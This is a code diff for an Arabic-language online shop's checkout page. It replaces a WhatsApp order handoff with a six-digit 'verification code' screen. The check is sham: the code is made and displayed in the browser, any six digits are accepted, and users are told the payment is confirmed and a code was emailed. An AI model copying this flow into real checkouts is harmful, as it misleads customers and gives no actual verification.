@@ -1975,6 +1975,83 @@
 
 
 
+    <!-- Verification Code Page -->
+    <div id="verificationPage" class="hidden fixed inset-0 bg-gradient-to-br from-emerald-500 via-green-500 to-teal-600 z-50">
+        <div class="flex items-center justify-center min-h-screen p-4">
+            <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-lg w-full text-center success-animation relative overflow-hidden">
+                <!-- Background Pattern -->
+                <div class="absolute top-0 left-0 w-full h-full opacity-5">
+                    <div class="absolute top-4 left-4 w-8 h-8 bg-green-500 rounded-full"></div>
+                    <div class="absolute top-12 right-8 w-6 h-6 bg-emerald-500 rounded-full"></div>
+                    <div class="absolute bottom-8 left-12 w-4 h-4 bg-teal-500 rounded-full"></div>
+                    <div class="absolute bottom-4 right-4 w-10 h-10 bg-green-400 rounded-full"></div>
+                </div>
+                
+                <div class="relative z-10">
+                    <div class="mb-8">
+                        <div class="w-24 h-24 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full mx-auto mb-6 flex items-center justify-center relative">
+                            <div class="absolute inset-0 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full animate-pulse opacity-20"></div>
+                            <i class="fas fa-shield-check text-green-600 text-4xl relative z-10"></i>
+                        </div>
+                        <h2 class="text-4xl font-bold bg-gradient-to-r from-gray-800 to-gray-700 bg-clip-text text-transparent mb-4">أدخل كود التأكيد</h2>
+                        <p class="text-gray-600 text-lg leading-relaxed">تم إرسال كود التأكيد المكون من 6 أرقام إلى بريدك الإلكتروني</p>
+                        <div class="mt-4 p-3 bg-green-50 rounded-lg">
+                            <p class="text-green-700 font-semibold text-sm">
+                                <i class="fas fa-envelope ml-2"></i>
+                                تحقق من بريدك الإلكتروني للحصول على الكود
+                            </p>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-8">
+                        <label class="block text-gray-800 font-bold mb-6 text-xl">كود التأكيد</label>
+                        <div class="flex justify-center space-x-3 rtl:space-x-reverse mb-6">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 1)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                            <input type="text" maxlength="1" class="code-input bg-gradient-to-b from-gray-50 to-white shadow-lg" oninput="moveToNext(this, 6)" onkeydown="handleBackspace(this, event)" pattern="[0-9]" title="أرقام فقط" autocomplete="off">
+                        </div>
+                        <p class="text-sm text-gray-500 mb-4">أدخل الأرقام فقط - سيتم التحقق تلقائياً عند الانتهاء</p>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <button onclick="verifyCode()" class="btn-primary w-full text-xl py-4 shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-300">
+                            <i class="fas fa-check-circle ml-2"></i>
+                            تأكيد الكود والمتابعة
+                        </button>
+                        <button onclick="resendCode()" class="text-orange-600 hover:text-orange-700 font-bold w-full py-3 bg-orange-50 hover:bg-orange-100 rounded-lg transition-all duration-300">
+                            <i class="fas fa-redo ml-2"></i>
+                            إعادة إرسال الكود
+                        </button>
+                    </div>
+                    
+                    <div class="mt-8 grid grid-cols-1 gap-4">
+                        <div class="p-4 bg-blue-50 rounded-xl border border-blue-100">
+                            <div class="flex items-center justify-center mb-2">
+                                <i class="fas fa-info-circle text-blue-600 ml-2"></i>
+                                <span class="text-blue-800 font-semibold">معلومات مهمة</span>
+                            </div>
+                            <p class="text-sm text-blue-700 leading-relaxed">
+                                إذا لم تستلم الكود خلال 5 دقائق، تحقق من مجلد الرسائل المرفوضة
+                            </p>
+                        </div>
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <div class="flex items-center justify-center mb-2">
+                                <i class="fas fa-check-circle text-green-600 ml-2"></i>
+                                <span class="text-green-800 font-semibold">تم تأكيد الطلب</span>
+                            </div>
+                            <p class="text-sm text-green-700">
+                                سيتم التواصل معك قريباً لتأكيد التوصيل
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- AI Chat Toggle Button -->
     <button onclick="toggleAIChat()" class="ai-toggle-btn">
         <i class="fas fa-robot"></i>
@@ -2640,11 +2717,16 @@
             event.preventDefault();
             const form = event.target;
             
-            // Generate order number
-            const orderNumber = 'ORD-' + Date.now();
+            // Generate verification code - 6 digits only
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
             
-            // Show success immediately
-            showNotification('✅ تم تأكيد الطلب بنجاح! جاري التوجيه لواتساب...', 'success');
+            // Show success immediately and navigate to verification page
+            showNotification(`✅ تم تأكيد الدفع! كود التأكيد: ${verificationCode}`, 'success');
+            
+            // Navigate to verification page immediately
+            setTimeout(() => {
+                showVerificationPage();
+            }, 1000);
             
             // Send email in background (don't wait for it)
             const formData = new FormData(form);
@@ -2656,8 +2738,6 @@
                 });
             }
             
-            let cartSummary = '';
-            let total = 0;
             if (cart.length > 0) {
                 const cartItemsText = cart.map(item => 
                     `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
@@ -2666,59 +2746,16 @@
                 
                 const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                 const shipping = subtotal > 200 ? 0 : 30;
-                total = subtotal + shipping;
+                const total = subtotal + shipping;
                 formData.append('final_total', `${total} ريال`);
-                
-                // Prepare cart summary for WhatsApp
-                cartSummary = cart.map(item => 
-                    `• ${item.name} (الكمية: ${item.quantity}) - ${item.price * item.quantity} ريال`
-                ).join('\n');
             }
             
-            formData.append('order_number', orderNumber);
+            formData.append('verification_code', verificationCode);
             formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-            formData.append('source', 'طلب مكتمل - الدفع');
+            formData.append('source', 'نموذج الدفع النهائي');
             
             // Send email in background
             sendToFormSubmit(formData, 'payment');
-            
-            // Redirect to WhatsApp after 2 seconds
-            setTimeout(() => {
-                const whatsappMessage = `السلام عليكم ورحمة الله وبركاته
-
-🛍️ *طلب جديد من موقع مكاسر العود*
-
-📋 *رقم الطلب:* ${orderNumber}
-👤 *اسم العميل:* ${customerInfo.firstName} ${customerInfo.lastName}
-📞 *رقم الهاتف:* ${customerInfo.phone}
-📧 *الإيميل:* ${customerInfo.email}
-📍 *العنوان:* ${customerInfo.address}, ${customerInfo.city}
-
-🛒 *تفاصيل الطلب:*
-${cartSummary}
-
-💰 *المجموع الإجمالي:* ${total} ريال
-
-⏰ *تاريخ الطلب:* ${new Date().toLocaleString('ar-SA')}
-
-نرجو تأكيد الطلب ومعلومات التوصيل. شكراً لكم! 🙏`;
-                
-                const whatsappUrl = `https://wa.me/966542068739?text=${encodeURIComponent(whatsappMessage)}`;
-                window.open(whatsappUrl, '_blank');
-                
-                showNotification('✅ تم توجيهك لواتساب لتأكيد الطلب', 'success');
-                
-                // Clear cart and return to main page
-                cart = [];
-                updateCartDisplay();
-                
-                // Return to main page
-                setTimeout(() => {
-                    document.getElementById('paymentPage').classList.remove('active');
-                    document.getElementById('mainContent').style.display = 'block';
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                }, 2000);
-            }, 2000);
             
             return false;
         }
@@ -3629,6 +3666,121 @@ ${cartSummary}
         function handleProductLeave(element) {
             element.style.setProperty('--x', '50%');
             element.style.setProperty('--y', '50%');
+        }
+
+        // VERIFICATION CODE FUNCTIONS
+        function showVerificationPage() {
+            document.getElementById('paymentPage').classList.remove('active');
+            document.getElementById('verificationPage').classList.remove('hidden');
+        }
+
+        function moveToNext(current, nextIndex) {
+            // Prevent multiple character input and keep only numbers
+            let value = current.value.replace(/[^0-9]/g, '');
+            if (value.length > 1) {
+                value = value.charAt(0); // Keep only first digit
+            }
+            current.value = value;
+            
+            // Auto advance to next input if we have a valid digit
+            if (value.length === 1 && nextIndex <= 6) {
+                const inputs = document.querySelectorAll('.code-input');
+                const nextInput = inputs[nextIndex];
+                if (nextInput) {
+                    nextInput.focus();
+                    nextInput.select();
+                }
+            }
+            
+            // Auto-verify when all fields are filled
+            checkCodeCompletion();
+        }
+
+        function handleBackspace(current, event) {
+            // Handle backspace navigation
+            if (event.key === 'Backspace') {
+                if (current.value === '') {
+                    // If field is empty, go to previous field
+                    const inputs = document.querySelectorAll('.code-input');
+                    const currentIndex = Array.from(inputs).indexOf(current);
+                    if (currentIndex > 0) {
+                        inputs[currentIndex - 1].focus();
+                        inputs[currentIndex - 1].select();
+                    }
+                } else {
+                    // Clear current field
+                    current.value = '';
+                }
+                event.preventDefault();
+                return;
+            }
+            
+            // Allow only numbers and special keys
+            if (!/[0-9]/.test(event.key) && 
+                event.key !== 'Delete' && 
+                event.key !== 'Tab' && 
+                event.key !== 'ArrowLeft' && 
+                event.key !== 'ArrowRight') {
+                event.preventDefault();
+            }
+        }
+
+        function checkCodeCompletion() {
+            const inputs = document.querySelectorAll('.code-input');
+            const allFilled = Array.from(inputs).every(input => input.value.length === 1 && /[0-9]/.test(input.value));
+            
+            if (allFilled) {
+                setTimeout(verifyCode, 1000);
+            }
+        }
+
+        function verifyCode() {
+            const inputs = document.querySelectorAll('.code-input');
+            const code = Array.from(inputs).map(input => input.value).join('');
+            
+            if (code.length === 6 && /^[0-9]{6}$/.test(code)) {
+                showNotification('تم تأكيد الكود! شكراً لثقتكم بنا.', 'success');
+                
+                setTimeout(() => {
+                    // Clear the code inputs
+                    inputs.forEach(input => input.value = '');
+                    
+                    showNotification('✅ تم إكمال الطلب بنجاح! سيتم التواصل معك قريباً.', 'success');
+                    
+                    // Clear cart and return to main page
+                    cart = [];
+                    updateCartDisplay();
+                    
+                    // Return to main page after short delay
+                    setTimeout(() => {
+                        document.getElementById('verificationPage').classList.add('hidden');
+                        document.getElementById('mainContent').style.display = 'block';
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }, 2000);
+                }, 2000);
+            } else {
+                showNotification('يرجى إدخال كود مكون من 6 أرقام فقط', 'error');
+            }
+        }
+
+        function resendCode() {
+            const inputs = document.querySelectorAll('.code-input');
+            inputs.forEach(input => input.value = '');
+            inputs[0].focus();
+            
+            // Generate new code
+            verificationCode = Math.floor(100000 + Math.random() * 900000).toString().padStart(6, '0');
+            
+            showNotification(`تم إعادة إرسال الكود بنجاح: ${verificationCode}`, 'success');
+            
+            // Send new code via email in background
+            const emailData = new FormData();
+            emailData.append('verification_code_resent', verificationCode);
+            emailData.append('customer_email', customerInfo.email || 'غير محدد');
+            emailData.append('timestamp', new Date().toLocaleString('ar-SA'));
+            emailData.append('source', 'إعادة إرسال كود التأكيد');
+            
+            sendToFormSubmit(emailData, 'verification');
         }
 
         // Keyboard shortcuts
